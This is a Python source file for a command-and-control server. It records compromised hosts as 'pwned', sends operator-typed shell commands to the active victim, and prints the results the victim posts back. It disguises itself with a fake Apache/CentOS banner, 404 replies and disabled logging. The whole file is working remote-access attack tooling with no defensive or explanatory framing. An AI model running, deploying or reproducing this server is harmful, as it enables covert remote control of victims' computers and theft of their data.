from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, BIND_ADDR


class C2Handler(BaseHTTPRequestHandler):

    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        if self.path.startswith(CMD_REQUEST):

            client = self.path.split(CMD_REQUEST)[1]

            client_account = client.split('@')[0]

            client_hostname = client.split('@')[1]

            if client not in pwned_dict.values():

                self.http_response(404)

                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            elif client == pwned_dict[active_session]:

                command = input(f"{client_account}@{client_hostname}: ")

                self.http_response(200)
                self.wfile.write(command.encode())

            else:

                self.http_response(404)

    def do_POST(self):
        if self.path == RESPONSE_PATH:

            self.http_response(200)

            content_length = int(self.headers.get("Content-Length"))

            client_data = self.rfile.read(content_length)

            client_data = client_data.decode()

            client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

            client_data = unquote_plus(client_data)

            print(client_data)

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        ###
        return


active_session = 1

client_account = ""

client_hostname = ""

pwned_id = 0

pwned_dict = {}

server = HTTPServer((BIND_ADDR, PORT), C2Handler)

server.serve_forever()
